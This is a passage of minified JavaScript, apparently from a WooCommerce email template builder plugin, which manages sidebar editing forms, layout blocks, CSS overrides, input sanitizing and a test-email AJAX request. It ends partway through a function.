function thwecmfEditBuilderBlocks(elm,blockId,blockName){thwecmf_settings.render_edit_block_sidebar_form(elm,blockId,blockName)}function thwecmfClearTemplateBuilder(elm){thwecmf_settings.clear_tbuilder_sidebar(elm)}function thwecmfDeleteBuilderBlocks(elm){thwecmf_settings.delete_builder_blocks(elm)}function thwecmfUploadImage(elm,prop){thwecmf_settings.setup_wp_image_upload(elm,prop)}function thwecmfClickAddRow(elm){thwecmf_settings.add_row_builder_action(elm)}function thwecmfSidebarBackNavigation(elm){thwecmf_settings.template_sidebar_back_navigation(elm)}function thwecmfCollapseCategory(elm){thwecmf_settings.setup_category_toggle(elm)}function thwecmfRemoveImgUploaded(elm){thwecmf_settings.remove_image_uploaded(elm)}function thwecmfClickTestMail(elm){thwecmf_settings.click_test_mail_button(elm)}function thwecmfClickTestMailAction(elm){thwecmf_settings.click_test_mail_action(elm)}function thwecmfCloseTestMail(elm){thwecmf_settings.close_test_mail_box(elm)}function thwecmfSaveTemplate(elm){thwecmf_settings.builder_prepare_save_template(elm)}function thwecmfTemplateEditListner(elm){thwecmf_settings.edit_template_event_listner(elm)}function thwecmfTemplateMapValidation(elm){thwecmf_settings.template_map_validation(elm)}function thwecmfMapFormToggle(elm){thwecmf_settings.map_form_toggle(elm)}function thwecmfCloseModal(elm){thwecmf_settings.close_modal(elm)}function thwecBuilderPreviewTab(elm){thwecmf_settings.toggle_builder_preview_tab(elm)}function thwecmfPreviewSidebarActions(elm){thwecmf_settings.preview_sidebar_actions(elm)}var thwecmf_settings=function($,window,document){"use strict";function setup_select2_template_map(){var select2=$("#wecmf_email_template_manager_table .thwecmf-mapping-table");select2.find(".thwecmf-template-map-select2.select2-hidden-accessible").select2("destroy"),select2.find(".thwecmf-template-map-select2").select2()}function validate_temp_name(tname,dependend){var validate=[],validation_set=[];return""==tname&&(validate.status=!1,validate.validate_flag="name",validate.message=dependend+" name is empty",validation_set.push(validate)),"Hook"==dependend?0==/^[a-zA-Z_]*$/.test(tname)&&(validate.status=!1,validate.validate_flag=!1,validate.message='Use only letters ([a-z],[A-Z]) and underscores ("_") for template name',validation_set.push(validate)):"Template"==dependend&&0==/^[a-zA-Z0-9-_ ]*$/.test(tname)&&(validate.status=!1,validate.validate_flag=!1,validate.message='Use only letters ([a-z],[A-Z]), digits ([0-9]), hyphen ("-") and underscores ("_") for template name',validation_set.push(validate)),validation_set}function click_test_mail_button(elm){var content=$("#thwecmf_modal_test_mail").html(),modal_box=$("#thwecmf_builder_header_action_box");remove_builder_panel_highlights(),modal_box.find(".content-box").html(content),modal_box.addClass("thwecmf-modal-active")}function remove_builder_panel_highlights(){$("#thwecmf-sidebar-configure .thwecmf-builder-elm-layers").find(".thwecmf-panel-highlight").removeClass("thwecmf-panel-highlight"),$("#tbf_t_builder").find(".thwecmf-builder-highlight").removeClass("thwecmf-builder-highlight")}function click_test_mail_action(elm){var button=$(elm),mail_id=button.siblings('input[name="test_mail_input"]').val(),validation_box=button.closest(".thwecmf-test-mail-modal").siblings(".thwecmf-action-validation-box"),valid_result=validate_test_email(mail_id);if(valid_result.valid)validation_box.html(""),prepare_ajax_test_email(validation_box);else{var error_msgs="";$.each(valid_result.errors,function(key,value){error_msgs+=prepare_validation_html(value,valid_result.valid)}),validation_box.html(error_msgs)}}function prepare_validation_html(message,valid){var html="";return html+='<p class="'+(valid?"thwecmf-validation-success":"thwecmf-validation-failed")+'">'+message+"</p>"}function prepare_ajax_test_email(msg_box){var template_ajax_load=$("#thwecmf-ajax-load-modal"),test_data={thwecmf_security:thwecmf_admin_var.ajax_nonce,action:"thwecmf_template_actions",thwecmf_action_index:"settings",name:thwecmf_admin_var.template,id:$("#thwecmf_preview_order").val(),email:$("#thwecmf_preview_email").val(),email_id:$("#test_mail_input").val()};$.ajax({type:"POST",url:ajaxurl,data:test_data,beforeSend:function(){template_ajax_load.addClass("thwecmf-ajax-loading")},success:function(data){data?msg_box.html(prepare_validation_html("Email sent successfully",!0)):msg_box.html(prepare_validation_html("Email not sent",!1))},complete:function(){template_ajax_load.removeClass("thwecmf-ajax-loading")},error:function(){alert("error")}})}function validate_test_email(mail_id){var validation_set={},error_msg=[];validation_set.valid=!0;var builder_valid=!0,email_valid=!0,split_pattern=mail_id.split("@");if(split_pattern){var validation1=(split_pattern[0],split_pattern[1]);if(""!=validation1&&null!=validation1){var valid_split=validation1.split("."),validation21=(valid_split[0],valid_split[1]);null!=validation21&&""!=validation21?email_valid=!0:(email_valid=!1,error_msg.push(TEST_MAIL_NOTICE))}else email_valid=!1,error_msg.push(TEST_MAIL_NOTICE)}return 0==$("#tbf_t_builder").find(".thwecmf-builder-block").length&&(error_msg.push("Add contents to the builder"),builder_valid=!1),validation_set.valid=!(!email_valid||!builder_valid),validation_set.errors=error_msg,validation_set}function close_test_mail_box(elm){$(elm).closest(".thwecmf-test-mail-wrapper").removeClass("thwecmf-test-mail-active")}function reload_page_listner(){window.addEventListener("beforeunload",function(event){prepare_page_reload_event(event)})}function prepare_page_reload_event(event){var result=!1,builder_obj=$("#tbf_t_builder"),block_length=builder_obj.find(".thwecmf-builder-block").length,data_track=builder_obj.attr("data-track-save"),data_global=builder_obj.attr("data-global-id"),data_css=builder_obj.attr("data-css-change"),data_sidebar=builder_obj.attr("data-sidebar-change");return builder_obj.length>0&&block_length>0&&data_track!=data_global?result=!0:"false"==data_css?result=!0:"false"==data_sidebar&&(result=!0),event?result?void(event.returnValue="o/"):"":result}function resize_scroll_support(){setup_sidebar_scrolls(),$(window).on("resize",function(){var active_tab1=$("#thwecmf-sidebar-configure.thwecmf-active-tab"),active_tab2=$("#thwecmf-sidebar-settings.thwecmf-active-tab");active_tab1.length>0?setup_sidebar_scrolls(active_tab1):active_tab2.length>0&&setup_sidebar_panel_scrolls(active_tab2,!0,!0,!0)})}function setup_sidebar_scrolls(active_tab1){active_tab1=active_tab1||$("#thwecmf-sidebar-configure.thwecmf-active-tab");var sidebar_wrapper=$("#thwecmf-sidebar-element-wrapper"),height1=sidebar_wrapper.height()-55;active_tab1.find(".thwecmf-layers-outer-wrapper").css({height:height1})}function setup_sidebar_panel_scrolls(active_tab2,layout_wrapper,edit_wrapper,element_wrapper){active_tab2=active_tab2||$("#thwecmf-sidebar-settings.thwecmf-active-tab");var sidebar_wrapper=$("#thwecmf-sidebar-element-wrapper"),height2=sidebar_wrapper.height()-4,height3=sidebar_wrapper.height()-4;layout_wrapper&&active_tab2.find(".wecmf-layout-panel-outer-wrapper").css({height:height2}),edit_wrapper&&active_tab2.find(".thwecmf_field_form_outer_wrapper").css({height:height3}),element_wrapper&&active_tab2.find(".outer-wrapper").css({height:height2})}function setup_category_toggle(elm){var click_cat=($(elm),$(elm).closest(".grid-category"));click_cat.hasClass("category-collapse")?(click_cat.removeClass("category-collapse"),$(".thwecmf-tbuilder-elm-grid-layout-element").find(".grid-category").not(click_cat).each(function(index,el){$(this).addClass("category-collapse")})):click_cat.addClass("category-collapse")}function tiptip_tooltips_setup(){var tiptip_args={attribute:"data-tip",fadeIn:50,fadeOut:50,delay:200};$(".tips").tipTip(tiptip_args)}function setup_colorpicker(form){form.find(".thpladmin-colorpick").iris({change:function(event,ui){var input=$(this);input.parent().find(".thpladmin-colorpickpreview").css({backgroundColor:ui.color.toString()}),input.val(ui.color.toString()),input.trigger("keyup")},hide:!0,border:!0}).click(function(){$(".iris-picker").hide(),$(this).closest("td").find(".iris-picker").show()}),$("body").click(function(){$(".iris-picker").hide()}),$(".thpladmin-colorpick").click(function(event){event.stopPropagation()})}function setup_colorpick_preview(form){form.find(".thpladmin-colorpick").each(function(){$(this).parent().find(".thpladmin-colorpickpreview").css({backgroundColor:this.value})})}function get_form_field_value(field,type){var value="";switch(type){case"select":case"textarea":default:value=field.val(),value=null==value?"":value;break;case"checkbox":value=field.prop("checked"),value=value?1:0}return value}function get_field_value(form,type,name){var value="";switch(type){case"select":value=form.find("select[name=i_"+name+"]").val(),value=null==value?"":value;break;case"checkbox":value=form.find("input[name=i_"+name+"]").prop("checked"),value=value?1:0;break;case"textarea":value=form.find("textarea[name=i_"+name+"]").val(),value=null==value?"":value;break;default:value=form.find("input[name=i_"+name+"]").val(),value=null==value?"":value}return value}function set_field_value(form,type,name,value,multiple){switch(type){case"select":1==multiple&&"string"==typeof value&&(value=value.split(","),name+="[]"),form.find('select[name="i_'+name+'"]').val(value);break;case"checkbox":value=1==value,form.find("input[name=i_"+name+"]").prop("checked",value);break;case"textarea":form.find("textarea[name=i_"+name+"]").val(value);break;default:form.find("input[name=i_"+name+"]").val(value)}}function thwecmfEscapeHTML(html){var fn=function(tag){return{'"':"&quot;","'":"&#39;"}[tag]||tag};return html.replace(/[&<>"]/g,fn)}function escapeScripts(html){var div=document.createElement("div");div.innerHTML=html;for(var scripts=div.getElementsByTagName("script"),i=scripts.length;i--;)scripts[i].parentNode.removeChild(scripts[i]);return div.innerHTML}function thwecmf_sanitize_field(string){return $($.parseHTML(string)).text()}function isCssValid(property,value){var div=$("<div>"),_old=div.css(property);div.css(property,value);var _new=div.css(property);return-1!==$.inArray(property,DIMENSION)&&"auto"==value||_old!=_new}function generate_rand_string(){var block_id=$("#tbf_t_builder").attr("data-global-id"),new_block_id=parseInt(block_id)+1;return $("#tbf_"+new_block_id).length>0?generate_random_id(new_block_id):$("#tbf_t_builder").attr("data-global-id",new_block_id),new_block_id}function generate_random_id(new_id){var new_id=parseInt(new_id)+1;$("#tbf_"+new_id).length>0?generate_random_id(new_id):$("#tbf_t_builder").attr("data-global-id",new_id)}function clean_block_name(name){return name.replace(/_/g," ").replace(/\b[a-z]/g,function(string){return string.toUpperCase()})}function is_row(name){return-1!==$.inArray(name,BUILDER_ROWS)}function is_column(name){return-1!==$.inArray(name,BUILDER_COLS)}function is_element(name){return-1!==$.inArray(name,BUILDER_ELMS)}function is_address(name){return-1!==$.inArray(name,ADDRESS_BLOCKS)}function is_hook(name){return-1!==$.inArray(name,BUILDER_HOOKS)}function is_content_inlcude_img(name){return-1!==$.inArray(name,IMG_CONTENT_BLOCKS)}function clear_tbuilder_sidebar(elm){var popup=$("#thwecmf_confirmation_alerts"),builder_css=$("#tbf_t_builder").attr("data-css-change");popup.find(".thwecmf-messages").html($("#thwecmf_clear_builder_confirm").html()),($(".thwecmf-builder-elm-layers .thwecmf-panel-builder-block").length>1||"false"==builder_css)&&popup.dialog("open")}function confirmation_tbuilder_clear(){var tb_builder=$("#tbf_t_builder");tb_builder.find(".thwecmf-builder-column").empty(),$("div.thwecmf-builder-elm-layers").empty(),setup_blank_sidebar_msg(),tb_builder.attr("data-css-props",TB_DEFAULT),tb_builder.attr("data-global-id","1000"),tb_builder.attr("data-track-save","1000"),$("#thwecmf_template_css_override").html(""),$("#thwecmf_template_css_preview_override").html("")}function reset_row_column_width(row,columns){var siblings_props,col_width=100/parseInt(columns);$("#tbf_t_builder").find("#tbf_"+row+" tbody > tr > td").each(function(index,el){var data_props=$(this).attr("data-css-props");if($(this).attr("id")){var block_id=$(this).attr("id").replace("tbf_","");if(data_props)data_props=JSON.parse(data_props),siblings_props=data_props;else var data_props=DEF_COL_PROPS;data_props.width=col_width+"%";var data_props_json=JSON.stringify(data_props);$(this).attr("data-css-props",data_props_json),prepare_builder_block_css(data_props,block_id,"column_clone")}})}function highlight_focus_blocks(b_elm,p_elm){var tbuilder_ref=$("#tbf_t_builder"),panel_ref=$(".thwecmf-sidebar-config-elm-layers");tbuilder_ref.find(".thwecmf-builder-highlight").removeClass("thwecmf-builder-highlight"),panel_ref.find(".thwecmf-panel-highlight").removeClass("thwecmf-panel-highlight"),p_elm.addClass("thwecmf-panel-highlight"),b_elm.addClass("thwecmf-builder-highlight"),$("html, body").animate({scrollTop:track_element_position_b(b_elm)},500);var panel_container=$(".thwecmf-layers-outer-wrapper");panel_container.animate({scrollTop:track_element_position_p(p_elm,panel_container)},500),setTimeout(function(){p_elm.removeClass("thwecmf-panel-highlight"),b_elm.removeClass("thwecmf-builder-highlight")},3e3)}function track_element_position_b(elm){return parseInt(elm.offset().top)-200}function track_element_position_p(elm,container){return parseInt(elm.offset().top-container.offset().top+container.scrollTop())-200}function builder_css_generator(props){var css="";return $.each(props,function(name,css_prop){if(name in BUILDER_CSS_PROPS){var css_pname=BUILDER_CSS_PROPS[name].name;css_prop=css_prop||DEFAULT_CSS[css_pname],css_prop&&(css+=css_pname+":"+css_prop+";")}}),css}function css_parent_selector(blockId,isPrev){var p_selector="#"+blockId;return isPrev?p_selector:p_selector+" "}function add_row_builder_action(elm){reset_sidebar_status(!1);setup_sidebar_content("layout"),setup_sidebar_panel_scrolls(!1,!0,!1,!1)}function delete_builder_blocks(elm){if($(elm).closest("div.thwecmf-panel-builder-block").hasClass("thwecmf-hooks")){var id=$(elm).closest("div.thwecmf-panel-builder-block").attr("id");$(elm).closest("div.thwecmf-panel-builder-block").remove();var block=$("#tbf_t_builder").find("#tbf_"+id),block_parent=block.closest(".thwecmf-columns");block.remove(),block_parent.find(".thwecmf-builder-block").length<1&&block_parent.find(".thwecmf-hook-code").length<1&&block_parent.html(EMPTY_TD_DATA)}else{var select_block=$(elm).closest("div.thwecmf-panel-builder-block"),delete_panel_elm=select_block,delete_id=select_block.attr("id"),builder_element=$("#tbf_t_builder").find("#tbf_"+delete_id),panel_element=$("div.thwecmf-builder-elm-layers").find("#"+delete_id);if(delete_panel_elm.hasClass("thwecmf-rows")||delete_panel_elm.hasClass("thwecmf-elements")){var builder_element_parent=builder_element.closest(".thwecmf-columns");builder_element.remove(),panel_element.remove(),builder_element_parent.find(".thwecmf-builder-block").length<1&&builder_element_parent.find(".thwecmf-hook-code").length<1&&builder_element_parent.html(EMPTY_TD_DATA)}else if(delete_panel_elm.hasClass("thwecmf-columns")){var builder_element_parent=builder_element.closest(".thwecmf-row"),panel_element_parent=panel_element.closest(".thwecmf-rows"),columns=panel_element_parent.attr("data-columns");if(columns<=1)builder_element_parent.remove(),panel_element_parent.remove();else{var updated_columns=parseInt(columns)-1;panel_element_parent.attr("data-columns",updated_columns),builder_element_parent.attr("data-column-count",updated_columns),builder_element.remove(),panel_element.remove();var builder_element_parent_id=builder_element_parent.attr("id").replace("tbf_","");reset_row_column_width(builder_element_parent_id,updated_columns)}}}$("#tbf_t_builder").attr("data-sidebar-change","false"),setup_blank_sidebar_msg()}function render_edit_block_sidebar_form(elm,blockId,blockName){setup_sidebar_content("settings"),populate_sidebar_content($("#thwecmf-sidebar-settings"),blockId,blockName),reset_sidebar_status(!1);var form=$("#thwecmf-sidebar-settings").find("form");set_field_value(form,"hidden","thwecmf_block_id",blockId,0),set_field_value(form,"hidden","thwecmf_block_name",blockName,0),setup_colorpicker(form),setup_colorpick_preview(form),tiptip_tooltips_setup(),additional_sidebar_styles(form),setup_sidebar_panel_scrolls(!1,!1,!0,!1)}function additional_sidebar_styles(form){form.find(".thwecmf-aligment-icon-wrapper").each(function(index,el){var icon_val=$(this).find('input[type="hidden"]').val();$(this).find(".img-wrapper[data-align='"+icon_val+"']").addClass("thwecmf-active-icon")})}function populate_sidebar_content(content,blockId,blockName){var form=$("#thwecmf-sidebar-settings").find("form");is_row(blockName)?content.find(".thwecmf_field_form_general td").html($("#thwecmf_field_form_id_row").html()):is_column(blockName)?content.find(".thwecmf_field_form_general td").html($("#thwecmf_field_form_id_col").html()):content.find(".thwecmf_field_form_general td").html($("#thwecmf_field_form_id_"+blockName).html()),populate_block_general_form(form,blockId,blockName)}function clean_text_data(text){var textArea=document.createElement("textarea");textArea.innerHTML=text;var value=textArea.value;return textArea.remove(),value}function get_default_props(block_name){var default_props="";if(is_row(block_name))default_props=BLOCK_PROPS[block_name].row;else if(is_column(block_name)){if(block_name in COLUMN_ROW_MAP){var column_key=COLUMN_ROW_MAP[block_name];default_props=BLOCK_PROPS[column_key].column}}else default_props=BLOCK_PROPS[block_name].css,default_props=$.extend({},default_props,BLOCK_PROPS[block_name].text);return default_props}function populate_block_general_form(form,blockId,blockName){var ref_elem=$("#tbf_"+blockId),block_props_json=ref_elem.attr("data-css-props"),block_props=!!block_props_json&&JSON.parse(block_props_json),url_props_json=ref_elem.attr("data-text-props"),url_props=url_props_json?JSON.parse(url_props_json):"",default_upload_url=form.find(".thwecmf-upload-preview").attr("data-default-url"),default_props=get_default_props(blockName),def_vals=form_default_values(blockName);block_props&&!$.isEmptyObject(block_props)&&$.each(default_props,function(key,value){value=key in block_props?block_props[key]:value;var props=EDIT_FORM_PROPS[key];if(EDIT_FORM_PROPS[key].attribute&&"yes"==EDIT_FORM_PROPS[key].attribute&&(value=key in VISIBLE_OPTIONS?"image"==blockName||"gif"==blockName||"header_details"==blockName?"url"==key?value==VISIBLE_OPTIONS[key].css?url_props[key]:"":value==VISIBLE_OPTIONS[key][blockName].css?url_props[key]:"":value==VISIBLE_OPTIONS[key].css?url_props[key]:"":url_props[key],"textarea_content"!=key&&"content"!=key||(value=clean_text_data(url_props[key]))),-1!=$.inArray(key,IMG_CSS)?value=!(!value||value===default_upload_url)&&value.match(/\((.*)\)/)[1]:"product_img"==key&&(value="block"==value?1:0),"fourside"==props.type&&(props.type="text"),"upload_img_url"==key){var upload_preview_class="header_details"==blockName?"image":blockName;value=""==value?default_upload_url:value,form.find(".thwecmf-img-preview-"+upload_preview_class+" .thwecmf-upload-preview img").attr("src",value),value!=default_upload_url&&form.find(".thwecmf-img-preview-"+upload_preview_class+" .thwecmf-remove-upload-btn").removeClass("thwecmf-remove-upload-inactive")}"upload_bg_url"==key&&(0!=value?form.find(".thwecmf-img-preview-bg_image .thwecmf-remove-upload-btn").removeClass("thwecmf-remove-upload-inactive"):value=default_upload_url,form.find(".thwecmf-img-preview-bg_image .thwecmf-upload-preview img").attr("src",value)),""==value&&""!=def_vals&&key in def_vals&&(value=def_vals[key]),set_field_value(form,props.type,props.name,value,0)})}function form_default_values(blockName){var default_values={};switch(blockName){case"one_column":case"two_column":default_values={p_t:"0px",p_r:"0px",p_b:"0px",p_l:"0px",m_t:"0px",m_r:"auto",m_b:"0px",m_l:"auto",b_t:"0px",b_r:"0px",b_b:"0px",b_l:"0px",bg_position:"center"};break;case"one_column_one":default_values={width:"100%",b_t:"1px",b_r:"1px",b_b:"1px",b_l:"1px",border_color:"#dddddd",border_style:"dotted"};break;case"two_column_one":case"two_column_two":default_values={width:"50%",b_t:"1px",b_r:"1px",b_b:"1px",b_l:"1px",border_color:"#dddddd",border_style:"dotted"};break;case"t_builder":default_values={b_t:"1px",b_r:"1px",b_b:"1px",b_l:"1px",border_style:"solid",border_color:"#dedede",bg_color:"#edf1e4"};break;default:default_values=""}return default_values}function add_builder_elements(blockName,blockId,col_count){var new_id=generate_rand_string(),track_html=prepare_sidebar_row_html(blockName,new_id);sidebar_track_data_blocks(prepare_builder_content_html(blockName,col_count),track_html,blockId),setup_blank_sidebar_msg()}function prepare_sidebar_row_html(blockName,row_id){if(is_row(blockName)){var html='<div id="'+row_id+'" class="thwecmf-rows thwecmf-panel-builder-block" data-columns="'+COL_TO_NUM[blockName]+'">';LAYOUT_HELPER.row="tbf_"+row_id,html+=$("#thwecmf_tracking_panel_row_html").html(),html=html.replace("{bl_id}",row_id),html=html.replace("{bl_name}",blockName),html=html.replace('data-icon-attr="{bl_name}"','data-icon-attr="'+blockName+'"'),html+='<div class="thwecmf-column-set">';for(var i=1;i<=COL_TO_NUM[blockName];i++){var column_id=generate_rand_string();LAYOUT_HELPER["column_"+i]="tbf_"+column_id,html+=prepare_sidebar_column_html(row_id,column_id,blockName,i)}}else if(is_hook(blockName)){var html=(clean_block_name(blockName),'<div id="'+row_id+'" class="thwecmf-hooks thwecmf-panel-builder-block">');html+=$("#thwecmf_tracking_panel_hook_html").html(),html=html.replace("{name}",clean_block_name(blockName)),html+="</div>",LAYOUT_HELPER.hook="tbf_"+row_id}else{var html='<div id="'+row_id+'" class="thwecmf-elements thwecmf-panel-builder-block">';html+=$("#thwecmf_tracking_panel_elm_html").html(),html=html.replace("{name}",clean_block_name(blockName)),html=html.replace("{bl_id}",row_id),html=html.replace("{bl_name}",blockName),html=html.replace("{bl_attr_name}",blockName.toLowerCase()),html+="</div>;",LAYOUT_HELPER.element="tbf_"+row_id}return html}function prepare_sidebar_column_html(row_id,column_id,blockName,i){var column_name=blockName+"_"+NUM_TO_WORDS[i];is_column(column_name)||(column_name="column_clone");var t_html='<div id="'+column_id+'" class="thwecmf-columns thwecmf-panel-builder-block" data-parent="'+row_id+'">';return t_html+=$("#thwecmf_tracking_panel_col_html").html(),t_html=t_html.replace("{bl_id}",column_id),t_html=t_html.replace("{bl_name}",column_name),t_html=t_html.replace('data-icon-attr="{bl_name}"','data-icon-attr="'+column_name+'"'),t_html+='<div class="thwecmf-element-set">',t_html+='<div class="thwecmf-hidden-sortable thwecmf-elements"></div><div class="thwecmf-btn-add-element panel-add-btn panel-add-element"><a href="#">Add Element</a></div>',t_html+="</div></div>"}function setup_blank_sidebar_msg(){$("div.thwecmf-builder-elm-layers").find(".thwecmf-rows").length<1?$(".thwecmf-empty-layer-msg").removeClass("thwecmf-layers-toggle"):$(".thwecmf-empty-layer-msg").addClass("thwecmf-layers-toggle")}function sidebar_track_data_blocks(builder_html,track_html,blockId){if(blockId){var id="tbf_"+blockId;$(track_html).insertBefore($("div.thwecmf-builder-elm-layers").find("#"+blockId+" > .thwecmf-element-set > div.panel-add-element"));var target=$("#tbf_t_builder").find("#"+id);target.find(">.thwecmf-btn-add-element").length>0&&target.find(">.thwecmf-btn-add-element").remove(),target.append(builder_html)}else $("div.thwecmf-builder-elm-layers").append(track_html),$("#tbf_t_builder .thwecmf-builder-column").append(builder_html)}function prepare_builder_content_html(blockName,col_count){var block_elm="",elm_type="";is_row(blockName)?(block_elm=$("#thwecmf_template_layout_"+blockName),elm_type="layout"):is_element(blockName)?(block_elm=$("#thwecmf_template_elm_"+blockName),elm_type="block"):is_hook(blockName)&&(block_elm=$("#thwecmf_template_hook_"+blockName),elm_type="hook");var block_html="";return block_elm.length&&(block_html="layout"==elm_type?clean_content_layout_html(block_elm,blockName):"hook"==elm_type?clean_content_element_html(block_elm,blockName,"hook",!1):clean_content_element_html(block_elm,blockName,"element",col_count)),block_html}function clean_content_layout_html(block_elm,blockName){var html=block_elm.html();html=html.replace(blockName,LAYOUT_HELPER.row);for(var i=1;i<=COL_TO_NUM[blockName];i++){var column_name="column_"+i,replace_name=blockName+"_"+i;html=html.replace(replace_name,LAYOUT_HELPER[column_name])}return LAYOUT_HELPER={},html}function clean_content_element_html(block_elm,blockName,index,col_count){var html=block_elm.html();return html=html.replace("{"+blockName+"}",LAYOUT_HELPER[index]),LAYOUT_HELPER={},html}function setup_sidebar_content($active_tab){"configure"==$active_tab||("layout"==$active_tab?$("#thwecmf-sidebar-settings").html($("#thwecmf_builder_panel_layout").html()):"layout-elements"==$active_tab?$("#thwecmf-sidebar-settings").html($("#thwecmf_template_builder_panel_layout_element").html()):"settings"==$active_tab&&$("#thwecmf-sidebar-settings").html($("#thwecmf_builder_block_edit_form").html()))}function template_sidebar_back_navigation(elm){$(elm).data("nav");reset_sidebar_status(!0)}function form_textarea_manipulate(str){var arrayOfLines=str.split(/\r?\n/),formated_content="";return $.each(arrayOfLines,function(index,item){formated_content+="<div class='wecmf-txt-wrap'>"+item+"<br></div>"}),formated_content}function encodeString(html){var fn=function(tag){return{'"':"&quot;","'":"&#39;","&":"&amp;","<":"&lt;",">":"&gt;","/":"&#x2F;","`":"&#x60;","=":"&#x3D;"}[tag]||tag};return html.replace(/[&<>"]/g,fn)}function clean_css_value(key,value,block_name,block_id,default_upload_url){return key in VISIBLE_OPTIONS&&(value="social"==block_name?valid_social_url(value)?VISIBLE_OPTIONS[key].css:"none":"image"==block_name||"gif"==block_name||"header_details"==block_name?"url"==key?""!==value?VISIBLE_OPTIONS[key].css:"none":""!==value&&value!==default_upload_url?VISIBLE_OPTIONS[key][block_name].css:"none":""!==value?VISIBLE_OPTIONS[key].css:"none"),-1!==$.inArray(key,IMG_CSS)&&value&&(value=value!==default_upload_url&&""!==value?"url("+value+")":""),"product_img"==key&&(value=1==value?"block":"none",set_order_table_product_image(value,block_id)),value}function valid_social_url(value){if(""==value)return!1;if("function"!=typeof URL)return!!ULR_REGEX.test(value);var errors=[];try{var url=new URL(value);/https/.test(url.protocol)||/http/.test(url.protocol)||errors.push("wrong protocol")}catch(err){errors.push("wrong url")}finally{return 0==errors.length}}function set_order_table_product_image(value,block_id){var elm=$("#tbf_"+block_id).find(".thwecmf-order-item-img");"block"==value?$("#tbf_"+block_id).find(".thwecmf-order-item-img").addClass("show-product-img"):"none"==value&&elm.hasClass("show-product-img")&&$("#tbf_"+block_id).find(".thwecmf-order-item-img").removeClass("show-product-img")}function save_sidebar_edit_form(field,event){var form=$("#thwecmf-sidebar-settings").find("form"),key=field.attr("name").replace("i_",""),block_id=get_field_value(form,"hidden","thwecmf_block_id"),block_name=get_field_value(form,"hidden","thwecmf_block_name"),sidebar_form_valid=[],save_block=$("#tbf_"+block_id),css_props={},js_props={},data_json_css=save_block.attr("data-css-props"),data_json_text=save_block.attr("data-text-props"),default_upload_url=$("#thwecmf-sidebar-element-wrapper").find(".thwecmf-upload-preview").attr("data-default-url");data_json_text=data_json_text||"{}",data_json_css=$.parseJSON(data_json_css),data_json_text=$.parseJSON(data_json_text);var data_css=$.extend({},data_json_css,data_json_text),value=get_form_field_value(field,event.target.type);key in ELM_FORM_PROPS&&(key=ELM_FORM_PROPS[key]);var default_props=get_default_props(block_name),style_props=key in EDIT_FORM_PROPS&&EDIT_FORM_PROPS[key];if(style_props){if(key in data_css||key in default_props)if(void 0!==style_props.attribute)if("textarea_content"==key){var cleaned_textarea=escapeScripts(value);data_json_text[key]=value,data_json_text[key]=encodeString(escapeScripts(value)),data_json_css[key]="",js_props[key]=cleaned_textarea,css_props[key]=""}else if("content"==key)js_props[key]=thwecmfEscapeHTML(thwecmf_sanitize_field(value)),css_props[key]="",data_json_text[key]=thwecmfEscapeHTML(thwecmf_sanitize_field(value)),data_json_css[key]="";else{data_json_text[key]=value,js_props[key]=value;var cleaned_value=clean_css_value(key,value,block_name,block_id,default_upload_url);data_json_css[key]=cleaned_value,css_props[key]=cleaned_value}else value=clean_css_value(key,value,block_name,block_id,default_upload_url),data_json_css[key]=value,css_props[key]=value;if(!$.isEmptyObject(css_props)&&key in BUILDER_CSS_PROPS){var css_prop=BUILDER_CSS_PROPS[key].name;if(!isCssValid(css_prop,""!=css_props[key]?css_props[key]:DEFAULT_CSS[css_prop]))return}if(0===sidebar_form_valid.length){if($("#thwecmf-sidebar-settings").find("#sb_validation_msg").html(""),data_json_css&&css_props){var css_json_props=JSON.stringify(data_json_css);save_block.attr("data-css-props",css_json_props)}if(!$.isEmptyObject(data_json_text)&&js_props){var text_json_props=JSON.stringify(data_json_text);save_block.attr("data-text-props",text_json_props)}$.each(FONT_LIST,function(key,value){key==css_props.font_family&&(css_props.font_family=value),key==css_props.details_font_family&&(css_props.details_font_family=value)}),"text"==block_name&&"textarea_content"==key&&(js_props[key]=form_textarea_manipulate(js_props[key])),perform_block_level_functions(block_id,block_name,css_props),prepare_builder_block_css(key,css_props,block_id,block_name),set_image_dimension_attributes(block_name,save_block),$.isEmptyObject(js_props)||prepare_builder_text_override(js_props,block_id,block_name),setup_colorpick_preview(form)}else{var message="";$.each(sidebar_form_valid,function(status,msg){message+='<p class="thwecmf-msg-error">'+msg.message+"</p>"}),$("#thwecmf-sidebar-settings").find("#sb_validation_msg").html(message)}$("#tbf_t_builder").attr("data-css-change",!1)}}function perform_block_level_functions(id,name,css){if(is_address(name)){if("align"in css){var align_float=css.align;$("#tbf_"+block_id).find(".thwecmf-address-alignment").attr("align",align_float)}}else if("order_details"==name){var align_float=css.align,order_block=$("#tbf_"+id);order_block.find(".thwecmf-order-padding").attr("align",align_float)}else if("social"==name){var align_content=css.content_align;$("#tbf_"+id+" .thwecmf-social-outer-td").attr("align",align_content)}}function set_image_dimension_attributes(name,obj){if(is_content_inlcude_img(name)){var img_obj=obj.find("img"),i_width=img_obj.width(),i_height=img_obj.height(),comp_size={c_width:i_width,c_height:i_height};img_obj.attr({width:i_width,height:i_height}),obj.attr("data-misc",JSON.stringify(comp_size))}}function prepare_builder_block_css(key,props,block_id,block_name){var tb_css_override_elm=$("#thwecmf_template_css_override"),tb_css_override=tb_css_override_elm.html();tb_css_override+=prepare_builder_css_override(key,props,"tbf_"+block_id,block_name,!0),tb_css_override_elm.html(tb_css_override);var prev_css_override_elm=$("#thwecmf_template_css_preview_override"),prev_css_override=prev_css_override_elm.html();prev_css_override+=prepare_builder_css_override(key,props,"tpf_"+block_id,block_name,!0),prev_css_override_elm.html(prev_css_override)}function prepare_builder_css_override(key,props,blockId,blockName,isPrev){var css="";switch(blockName){case"one_column":case"two_column":case"three_column":case"four_column":css=prepare_layout_row_css_override(key,props,blockId,isPrev);break;case"one_column_one":case"two_column_one":case"two_column_two":case"three_column_one":case"three_column_two":case"three_column_three":case"four_column_one":case"four_column_two":case"four_column_three":case"four_column_four":
